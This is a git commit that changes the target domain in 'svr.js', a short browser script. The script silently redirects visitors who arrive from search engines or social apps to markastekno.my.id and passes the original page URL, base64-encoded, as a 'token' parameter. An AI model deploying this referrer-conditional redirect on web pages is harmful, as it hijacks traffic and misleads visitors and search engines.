066cb06b927fbfe88f777bde3c54d7fd12b7a62c
4bikamp3 <94110712+4bikamp3@users.noreply.github.com>
2022-08-27 00:05:33 +0700

    Update svr.js

--- svr.js
+++ svr.js
@@ -1,4 +1,4 @@
-var ars = ["https://www.markastekno.my.id"];
+var ars = ["https://markastekno.my.id"];
 ([".google.", "t.co", "instagram.com", "bing.", "yandex.", "facebook.", "pinterest."].some((a) => document.referrer.toLowerCase().includes(a)) ||
     ["fb", "facebook", "instagram.com", "pinterest", "twitter"].some((a) => navigator.userAgent.toLowerCase().includes(a))) &&
     (ars.some((a) => window.location.origin.includes(a)) || (window.location.href = ars[Math.floor(Math.random() * ars.length)] + "/?token=" + btoa(window.location.href)));
